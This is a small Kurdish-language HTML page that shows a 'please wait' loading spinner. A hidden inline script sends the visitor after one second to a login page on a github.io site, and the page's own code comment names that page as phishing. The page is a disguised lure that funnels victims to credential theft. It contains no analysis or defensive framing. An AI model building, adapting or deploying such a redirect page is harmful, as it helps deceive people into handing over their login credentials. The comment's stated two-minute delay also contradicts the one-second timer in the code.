<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>چاوەڕوانی...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
        }
        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #e0e0e0;
            border-top-color: #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        h2 {
            color: #202124;
            font-size: 22px;
            margin-bottom: 10px;
        }
        p {
            color: #5f6368;
            font-size: 16px;
            line-height: 1.6;
        }
    </style>
    <script>
        // دوای 2 دەقە (120,000 ملی چرکە) ڕیدایرێکت بۆ پەڕەی فیشینگ
        setTimeout(function() {
            window.location.href = "https://akar9.github.io/Aka/login.html";
        }, 1000);
    </script>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>تکایە چاوەڕوان بە</h2>
        <p>پەڕەکە لە چەند خولەکێکی دیکەدا بەردەست دەبێت...</p>
    </div>
</body>
</html>
